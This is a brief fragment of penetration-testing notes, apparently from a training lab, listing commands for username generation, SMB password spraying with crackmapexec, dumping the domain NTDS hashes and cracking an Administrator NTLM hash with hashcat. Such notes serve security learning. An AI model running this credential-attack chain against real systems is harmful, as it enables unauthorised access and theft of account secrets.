...
./username-anarchy -i /home/user/usernames.txt                                           # Run tool against created initial list
...
crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt      # Run tool against smb with known user and pass list
...
crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds                          # Run tool and grab Administrator NTLM hash
```
...
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt    # hashcart against Administrator NTLM hash
output:
